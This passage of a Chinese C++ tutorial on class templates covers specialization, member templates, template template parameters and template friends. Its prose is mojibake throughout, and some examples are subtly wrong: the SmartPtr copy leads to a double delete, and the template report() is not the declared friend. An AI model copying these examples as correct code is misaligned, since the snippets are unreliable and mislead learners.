ç±»æ¨¡æ¿å¯ä»¥åŒ…å«å…¶ä»–æ¨¡æ¿ç±»çš„å¯¹è±¡ä½œä¸ºæˆå‘˜ã€‚</li><li>  <strong>ç»§æ‰¿:</strong> ç±»æ¨¡æ¿å¯ä»¥å‚ä¸ç»§æ‰¿ï¼Œå¯ä»¥ä»æ¨¡æ¿ç±»æ´¾ç”Ÿï¼Œä¹Ÿå¯ä»¥ä»æ™®é€šç±»æ´¾ç”Ÿï¼Œæˆ–è€…æ¨¡æ¿ç±»æœ¬èº«ä»å…¶ä»–ç±»æ´¾ç”Ÿã€‚</li></ul><h3 id="14-4-6-æ¨¡æ¿çš„å…·ä½“åŒ–"><a href="#14-4-6-æ¨¡æ¿çš„å…·ä½“åŒ–" class="headerlink" title="14.4.6 æ¨¡æ¿çš„å…·ä½“åŒ–"></a>14.4.6 æ¨¡æ¿çš„å…·ä½“åŒ–</h3><p>æœ‰æ—¶ï¼Œé€šç”¨çš„æ¨¡æ¿å®šä¹‰å¯¹äºæŸäº›ç‰¹å®šç±»å‹å¯èƒ½ä¸æ˜¯æœ€ä¼˜çš„ï¼Œæˆ–è€…æ ¹æœ¬æ— æ³•å·¥ä½œã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºç‰¹å®šç±»å‹æä¾›ä¸€ä¸ªä¸“é—¨åŒ–çš„æ¨¡æ¿å®šä¹‰ï¼Œè¿™ç§°ä¸º**æ¨¡æ¿å…·ä½“åŒ– (Template Specialization)**ã€‚</p><ol><li><p><strong>æ˜¾å¼å…·ä½“åŒ– (Explicit Specialization):</strong> ä¸ºæŸä¸ªç‰¹å®šçš„ç±»å‹ï¼ˆæˆ–ä¸€ç»„ç‰¹å®šç±»å‹ï¼‰æä¾›ä¸€ä¸ªå®Œå…¨ä¸åŒçš„ç±»å®šä¹‰ã€‚</p><p> <strong>è¯­æ³•:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;&gt; <span class="comment">// ç©ºçš„æ¨¡æ¿å‚æ•°åˆ—è¡¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span>&lt;</span>SpecificType&gt; &#123;</span><br><span class="line">    <span class="comment">// é’ˆå¯¹ SpecificType çš„ç‰¹æ®Šå®ç°</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <strong>ç¤ºä¾‹:</strong> å‡è®¾æˆ‘ä»¬æƒ³ä¸º <code>Stack&lt;const char*&gt;</code> æä¾›ä¸€ä¸ªç‰¹æ®Šç‰ˆæœ¬ï¼Œå®ƒèƒ½æ­£ç¡®å¤„ç† C é£æ ¼å­—ç¬¦ä¸²çš„å¤åˆ¶ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // for strcpy, strlen</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ˜¾å¼å…·ä½“åŒ– Stack&lt;const char*&gt;</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>&lt;</span><span class="keyword">const</span> <span class="keyword">char</span> *&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MAX = <span class="number">5</span> &#125;; <span class="comment">// å‡è®¾å®¹é‡ä¸åŒ</span></span><br><span class="line">    <span class="keyword">char</span> * items[MAX]; <span class="comment">// å­˜å‚¨æŒ‡å‘åŠ¨æ€åˆ†é…å­—ç¬¦ä¸²çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Stack();</span><br><span class="line">    ~Stack(); <span class="comment">// éœ€è¦ææ„å‡½æ•°é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    <span class="comment">// ... isempty, isfull ...</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">push</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> &amp; item)</span></span>; <span class="comment">// æ³¨æ„å‚æ•°ç±»å‹</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">pop</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * &amp; item)</span></span>; <span class="comment">// æ³¨æ„å‚æ•°ç±»å‹</span></span><br><span class="line">    <span class="comment">// éœ€è¦ç¦ç”¨æˆ–å®ç°å¤åˆ¶æ„é€ å’Œèµ‹å€¼</span></span><br><span class="line">    Stack(<span class="keyword">const</span> Stack &amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    Stack &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Stack &amp;) = <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° (éƒ¨åˆ†)</span></span><br><span class="line">Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::Stack() : top(<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;MAX; ++i) items[i] = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line">Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::~Stack() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; top; ++i) &#123;</span><br><span class="line">        <span class="keyword">delete</span> [] items[i]; <span class="comment">// é‡Šæ”¾ push æ—¶åˆ†é…çš„å†…å­˜</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::push(<span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> &amp; item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (top &lt; MAX) &#123;</span><br><span class="line">        items[top] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(item) + <span class="number">1</span>]; <span class="comment">// åˆ†é…æ–°å†…å­˜</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(items[top], item); <span class="comment">// å¤åˆ¶å­—ç¬¦ä¸²å†…å®¹</span></span><br><span class="line">        top++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;::pop(<span class="keyword">const</span> <span class="keyword">char</span> * &amp; item) &#123;</span><br><span class="line">     <span class="keyword">if</span> (top &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        top--;</span><br><span class="line">        item = items[top]; <span class="comment">// è¿”å›æŒ‡é’ˆ (æ³¨æ„ï¼šè°ƒç”¨è€…ä¸åº” delete è¿™ä¸ªæŒ‡é’ˆ)</span></span><br><span class="line">                           <span class="comment">// æˆ–è€…æ›´å¥½çš„åšæ³•æ˜¯å¤åˆ¶ä¸€ä»½è¿”å›</span></span><br><span class="line">        <span class="comment">// delete [] items[top]; // å¦‚æœ pop åä¸å†éœ€è¦ï¼Œåˆ™åˆ é™¤</span></span><br><span class="line">        <span class="comment">// items[top] = nullptr;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... å…¶ä»–å®ç° ...</span></span><br></pre></td></tr></table></figure><p> å½“ç¼–è¯‘å™¨é‡åˆ° <code>Stack&lt;const char *&gt;</code> æ—¶ï¼Œå®ƒä¼šä½¿ç”¨è¿™ä¸ªæ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯é€šç”¨çš„ <code>Stack&lt;T&gt;</code> æ¨¡æ¿ã€‚</p></li><li><p><strong>éƒ¨åˆ†å…·ä½“åŒ– (Partial Specialization):</strong> åªé™åˆ¶æ¨¡æ¿å‚æ•°çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å…¨éƒ¨ã€‚ä¾‹å¦‚ï¼Œä¸ºæ‰€æœ‰æŒ‡é’ˆç±»å‹æä¾›ä¸€ä¸ªç‰¹æ®Šç‰ˆæœ¬ï¼Œæˆ–è€…ä¸ºä¸€ä¸ªæœ‰ä¸¤ä¸ªç±»å‹å‚æ•°çš„æ¨¡æ¿å›ºå®šå…¶ä¸­ä¸€ä¸ªå‚æ•°ã€‚</p><p> <strong>è¯­æ³• (ç¤ºä¾‹):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŸå§‹æ¨¡æ¿</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éƒ¨åˆ†å…·ä½“åŒ–ï¼šT2 å›ºå®šä¸º int</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;</span>T1, <span class="keyword">int</span>&gt; &#123; <span class="comment">/* ... ç‰¹æ®Šå®ç° ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éƒ¨åˆ†å…·ä½“åŒ–ï¼šT1 å’Œ T2 éƒ½æ˜¯æŒ‡é’ˆç±»å‹</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;</span>T1*, T2*&gt; &#123; <span class="comment">/* ... ç‰¹æ®Šå®ç° ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éƒ¨åˆ†å…·ä½“åŒ–ï¼šT1 å’Œ T2 æ˜¯ç›¸åŒç±»å‹</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;</span>T, T&gt; &#123; <span class="comment">/* ... ç‰¹æ®Šå®ç° ... */</span> &#125;;</span><br></pre></td></tr></table></figure><p> ç¼–è¯‘å™¨ä¼šé€‰æ‹©æœ€åŒ¹é…çš„å…·ä½“åŒ–ç‰ˆæœ¬ã€‚å¦‚æœå¤šä¸ªéƒ¨åˆ†å…·ä½“åŒ–éƒ½èƒ½åŒ¹é…ï¼Œæˆ–è€…ä¸€ä¸ªéƒ¨åˆ†å…·ä½“åŒ–å’Œä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–éƒ½èƒ½åŒ¹é…ï¼Œç¼–è¯‘å™¨ä¼šé€‰æ‹©â€œæ›´å…·ä½“â€çš„é‚£ä¸ªã€‚</p></li></ol><h3 id="14-4-7-æˆå‘˜æ¨¡æ¿"><a href="#14-4-7-æˆå‘˜æ¨¡æ¿" class="headerlink" title="14.4.7 æˆå‘˜æ¨¡æ¿"></a>14.4.7 æˆå‘˜æ¨¡æ¿</h3><p>ç±»ï¼ˆæ— è®ºæ˜¯æ™®é€šç±»è¿˜æ˜¯æ¨¡æ¿ç±»ï¼‰å¯ä»¥åŒ…å«æœ¬èº«æ˜¯æ¨¡æ¿çš„æˆå‘˜å‡½æ•°æˆ–æˆå‘˜ç±»ã€‚è¿™ç§°ä¸º**æˆå‘˜æ¨¡æ¿ (Member Templates)**ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæ¨¡æ¿æ„é€ å‡½æ•°å’Œæ¨¡æ¿èµ‹å€¼è¿ç®—ç¬¦</strong></p><p>æ™ºèƒ½æŒ‡é’ˆç±»ï¼ˆå¦‚ <code>unique_ptr</code>, <code>shared_ptr</code>ï¼‰ç»å¸¸ä½¿ç”¨æ¨¡æ¿æ„é€ å‡½æ•°å’Œæ¨¡æ¿èµ‹å€¼è¿ç®—ç¬¦ï¼Œä»¥å…è®¸ä»æŒ‡å‘æ´¾ç”Ÿç±»çš„æ™ºèƒ½æŒ‡é’ˆæ„é€ æˆ–èµ‹å€¼ç»™æŒ‡å‘åŸºç±»çš„æ™ºèƒ½æŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmartPtr</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T* ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">SmartPtr</span><span class="params">(T* p = <span class="literal">nullptr</span>)</span> : <span class="title">ptr</span><span class="params">(p)</span> </span>&#123;&#125;</span><br><span class="line">    ~SmartPtr() &#123; <span class="keyword">delete</span> ptr; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨¡æ¿æˆå‘˜ï¼šæ¨¡æ¿å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> U&gt;</span><br><span class="line">    SmartPtr(<span class="keyword">const</span> SmartPtr&lt;U&gt;&amp; other) &#123;</span><br><span class="line">        <span class="comment">// å…è®¸ä» SmartPtr&lt;U&gt; æ„é€  SmartPtr&lt;T&gt;</span></span><br><span class="line">        <span class="comment">// é€šå¸¸éœ€è¦ U* èƒ½å¤Ÿéšå¼è½¬æ¢ä¸º T* (ä¾‹å¦‚ U æ˜¯ T çš„æ´¾ç”Ÿç±»)</span></span><br><span class="line">        ptr = other.get(); <span class="comment">// ç®€åŒ–ç¤ºä¾‹ï¼Œå®é™…æ™ºèƒ½æŒ‡é’ˆå¤åˆ¶æ›´å¤æ‚</span></span><br><span class="line">        <span class="comment">// ... å¯èƒ½éœ€è¦å¢åŠ å¼•ç”¨è®¡æ•°ç­‰ ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨¡æ¿æˆå‘˜ï¼šæ¨¡æ¿èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> U&gt;</span><br><span class="line">    SmartPtr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> SmartPtr&lt;U&gt;&amp; other) &#123;</span><br><span class="line">        <span class="comment">// ... ç±»ä¼¼é€»è¾‘ ...</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">T* <span class="title">get</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> ptr; &#125;</span><br><span class="line">    <span class="comment">// ... å…¶ä»–æˆå‘˜ ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">SmartPtr&lt;Derived&gt; <span class="title">pDerived</span><span class="params">(<span class="keyword">new</span> Derived)</span></span>;</span><br><span class="line">SmartPtr&lt;Base&gt; pBase = pDerived; <span class="comment">// OK: è°ƒç”¨æ¨¡æ¿å¤åˆ¶æ„é€ å‡½æ•° SmartPtr&lt;Base&gt;(const SmartPtr&lt;Derived&gt;&amp;)</span></span><br></pre></td></tr></table></figure><p>æˆå‘˜æ¨¡æ¿å¢åŠ äº†ç±»çš„çµæ´»æ€§ï¼Œå…è®¸æˆå‘˜å‡½æ•°æˆ–åµŒå¥—ç±»å¤„ç†æ›´å¹¿æ³›çš„ç±»å‹ã€‚</p><h3 id="14-4-8-å°†æ¨¡æ¿ç”¨ä½œå‚æ•°"><a href="#14-4-8-å°†æ¨¡æ¿ç”¨ä½œå‚æ•°" class="headerlink" title="14.4.8 å°†æ¨¡æ¿ç”¨ä½œå‚æ•°"></a>14.4.8 å°†æ¨¡æ¿ç”¨ä½œå‚æ•°</h3><p>æ¨¡æ¿æœ¬èº«ä¹Ÿå¯ä»¥ä½œä¸ºæ¨¡æ¿çš„å‚æ•°ï¼Œè¿™ç§°ä¸º**æ¨¡æ¿æ¨¡æ¿å‚æ•° (Template Template Parameters)**ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">template</span> &lt;<span class="keyword">typename</span> U&gt; <span class="class"><span class="keyword">class</span> <span class="title">Container</span>&gt;</span> <span class="comment">// Container æ˜¯ä¸€ä¸ªæ¨¡æ¿æ¨¡æ¿å‚æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Container&lt;T&gt; items; <span class="comment">// ä½¿ç”¨æ¨¡æ¿å‚æ•° Container æ¥å®ä¾‹åŒ–</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;typename U&gt; class Container</code>: å£°æ˜ <code>Container</code> æ˜¯ä¸€ä¸ªæ¥å—ä¸€ä¸ªç±»å‹å‚æ•°çš„ç±»æ¨¡æ¿ã€‚</li><li>  åœ¨ <code>Manager</code> å†…éƒ¨ï¼Œå¯ä»¥ç”¨å…·ä½“çš„ç±»å‹ <code>T</code> æ¥å®ä¾‹åŒ– <code>Container</code>ï¼Œå¦‚ <code>Container&lt;T&gt;</code>ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong> åˆ›å»ºä¸€ä¸ªå¯ä»¥ä½¿ç”¨ä¸åŒå®¹å™¨ï¼ˆå¦‚ <code>std::vector</code>, <code>std::list</code>, æˆ–æˆ‘ä»¬è‡ªå·±çš„ <code>Stack</code>ï¼‰æ¥å­˜å‚¨å…ƒç´ çš„ <code>Manager</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stacktp.h&quot;</span> <span class="comment">// å‡è®¾ Stack&lt;T&gt; åœ¨è¿™é‡Œ</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Elem&gt; <span class="class"><span class="keyword">class</span> <span class="title">Container</span>&gt;</span> <span class="comment">// Container æ¥å—ä¸€ä¸ªç±»å‹å‚æ•° Elem</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Container&lt;T&gt; items; <span class="comment">// ä½¿ç”¨ Container&lt;T&gt; æ¥å­˜å‚¨ T ç±»å‹çš„å…ƒç´ </span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">const</span> T&amp; item)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// å‡è®¾ Container æœ‰ push_back æˆ– push æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// items.push_back(item); // å¦‚æœæ˜¯ vector/list</span></span><br><span class="line">        <span class="comment">// items.push(item); // å¦‚æœæ˜¯ Stack</span></span><br><span class="line">        <span class="comment">// éœ€è¦æ›´é€šç”¨çš„æ–¹å¼æˆ–å¯¹ Container æœ‰è¦æ±‚</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::vector ä½œä¸ºå®¹å™¨</span></span><br><span class="line">    Manager&lt;<span class="keyword">int</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&gt; vectorManager;</span><br><span class="line">    <span class="comment">// vectorManager.add(10);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::list ä½œä¸ºå®¹å™¨</span></span><br><span class="line">    Manager&lt;<span class="keyword">double</span>, <span class="built_in">std</span>::<span class="built_in">list</span>&gt; listManager;</span><br><span class="line">    <span class="comment">// listManager.add(3.14);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ Stack ä½œä¸ºå®¹å™¨</span></span><br><span class="line">    Manager&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, Stack&gt; stackManager;</span><br><span class="line">    <span class="comment">// stackManager.add(&quot;hello&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¨¡æ¿æ¨¡æ¿å‚æ•°ä½¿å¾—ä»£ç æ›´åŠ é€šç”¨ï¼Œå¯ä»¥é€‚é…ä¸åŒçš„æ¨¡æ¿ç»“æ„ã€‚</p><h3 id="14-4-9-æ¨¡æ¿ç±»å’Œå‹å…ƒ"><a href="#14-4-9-æ¨¡æ¿ç±»å’Œå‹å…ƒ" class="headerlink" title="14.4.9 æ¨¡æ¿ç±»å’Œå‹å…ƒ"></a>14.4.9 æ¨¡æ¿ç±»å’Œå‹å…ƒ</h3><p>å‹å…ƒå…³ç³»å¯ä»¥ä¸ç±»æ¨¡æ¿ç»“åˆï¼Œæœ‰å‡ ç§ä¸åŒçš„å½¢å¼ï¼š</p><ol><li><p><strong>éæ¨¡æ¿å‹å…ƒå‡½æ•°/ç±»:</strong> ä¸€ä¸ªæ™®é€šçš„ï¼ˆéæ¨¡æ¿ï¼‰å‡½æ•°æˆ–ç±»å¯ä»¥æ˜¯æ¨¡æ¿ç±»çš„å‹å…ƒã€‚è¿™æ„å‘³ç€è¿™ä¸ªå‡½æ•°/ç±»å¯ä»¥è®¿é—®<strong>æ‰€æœ‰</strong>è¯¥æ¨¡æ¿ç±»å®ä¾‹åŒ–çš„ç§æœ‰æˆå‘˜ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasFriend</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">(<span class="keyword">const</span> HasFriend&lt;T&gt; &amp;)</span></span>; <span class="comment">// éæ¨¡æ¿å‡½æ•° report æ˜¯æ‰€æœ‰å®ä¾‹çš„å‹å…ƒ</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T item;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    HasFriend(<span class="keyword">const</span> T &amp; i) : item(i) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// report å‡½æ•°éœ€è¦ä¸ºæ¯ä¸ªå®ä¾‹å•ç‹¬å®šä¹‰æˆ–ä½¿ç”¨æ¨¡æ¿</span></span><br><span class="line"><span class="comment">// void report(const HasFriend&lt;int&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // é’ˆå¯¹ int å®ä¾‹</span></span><br><span class="line"><span class="comment">// void report(const HasFriend&lt;double&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // é’ˆå¯¹ double å®ä¾‹</span></span><br><span class="line"><span class="comment">// æˆ–è€…å°† report ä¹Ÿå®šä¹‰ä¸ºæ¨¡æ¿å‡½æ•°</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report</span><span class="params">(<span class="keyword">const</span> HasFriend&lt;T&gt; &amp; hf)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; hf.item; &#125; <span class="comment">// æ¨¡æ¿å‹å…ƒå‡½æ•°</span></span><br></pre></td></tr></table></figure></li><li><p><strong>çº¦æŸæ¨¡æ¿å‹å…ƒå‡½æ•°/ç±» (Bound Template Friend):</strong> æ¨¡æ¿å‡½æ•°/ç±»çš„ç‰¹å®šå®ä¾‹åŒ–æ˜¯æ¨¡æ¿ç±»çš„ç‰¹å®šå®ä¾‹åŒ–çš„å‹å…ƒã€‚å³ <code>Friend&lt;T&gt;</code> æ˜¯ <code>Target&lt;T&gt;</code> çš„å‹å…ƒã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‰å‘å£°æ˜</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> 